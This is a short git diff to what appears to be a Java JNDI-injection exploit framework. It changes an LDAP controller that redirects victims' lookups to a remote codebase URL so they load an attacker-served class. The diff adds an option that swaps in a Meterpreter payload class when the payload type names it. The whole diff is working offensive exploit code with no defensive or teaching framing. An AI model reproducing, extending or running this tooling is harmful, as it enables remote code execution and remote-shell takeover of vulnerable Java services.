@@ -9,6 +9,7 @@ import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Util;
 import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
 import com.qi4l.jndi.template.CommandTemplate;
+import com.qi4l.jndi.template.echo.Meterpreter;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -55,8 +56,12 @@ public class BasicController implements LdapController {
                 className = commandTemplate.getClassName();
             }
 
+            if (payloadType.contains("meterpreter")) {
+                className = Meterpreter.class.getName();
+            }
+
             String className1 = className.replaceAll("\\.", "/");
-            URL turl = new URL(new URL(this.codebase), className1 + ".class");
+            URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
             System.out.println(ansi().render("@|green [+] Send LDAP reference result for |@" + base + " @|green redirecting to |@" + turl));
             System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
             e.addAttribute("javaClassName", "foo");
